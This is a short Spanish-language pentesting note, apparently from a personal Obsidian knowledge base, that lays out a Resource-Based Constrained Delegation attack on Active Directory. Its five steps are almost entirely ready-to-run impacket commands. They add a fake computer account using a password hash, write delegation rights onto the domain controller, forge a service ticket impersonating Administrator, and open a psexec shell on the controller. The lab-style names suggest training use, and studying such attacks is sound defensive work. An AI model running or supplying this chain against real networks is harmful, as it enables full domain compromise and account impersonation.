---
title: Resource-Based Constrained Delegation (RBCD)
tags: [ad, rbcd, kerberos, impacket, delegation]
---

# Resource-Based Constrained Delegation (RBCD)

> [!important] Requisito
> Necesitas tener **GenericAll** (o permisos de escritura en msDS-AllowedToActOnBehalfOfOtherIdentity) sobre un equipo del dominio.

## Ataque

### 1. Crear equipo falso

```bash
# Con hash
impacket-addcomputer RESOURCED.LOCAL/L.LIVINGSTONE -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808 -computer-name FAKEPC -computer-pass "Pass123!"

# Con contraseña
addcomputer.py RESOURCED.LOCAL/L.LIVINGSTONE:password -computer-name FAKEPC -computer-pass Pass123!
```

### 2. Configurar RBCD (delegar de FAKEPC a DC)

```bash
rbcd.py RESOURCED.LOCAL/L.LIVINGSTONE:password -action write -delegate-from FAKEPC$ -delegate-to RESOURCEDC$
```

### 3. Obtener ST como Administrator usando CIFS

```bash
impacket-getST RESOURCED.LOCAL/FAKEPC\$:'Pass123!' -spn cifs/RESOURCEDC.RESOURCED.LOCAL -impersonate Administrator
```

### 4. Exportar ticket

```bash
export KRB5CCNAME=Administrator@cifs_RESOURCEDC.RESOURCED.LOCAL@RESOURCED.LOCAL.ccache
```

### 5. Acceder al DC

```bash
impacket-psexec -k -no-pass RESOURCED.LOCAL/Administrator@RESOURCEDC.RESOURCED.LOCAL
```

> [!tip] Por qué CIFS
> CIFS es el protocolo necesario para SMB/PsExec — permite `impacket-psexec` que usa named pipes a través de SMB.

## Ver también
- [[05-ad-attacks/kerberos/rbcd|RBCD]]
- [[05-ad-attacks/kerberos/constrained-delegation|Constrained Delegation]]
- [[05-ad-attacks/kerberos/s4u2self|S4U2Self]]
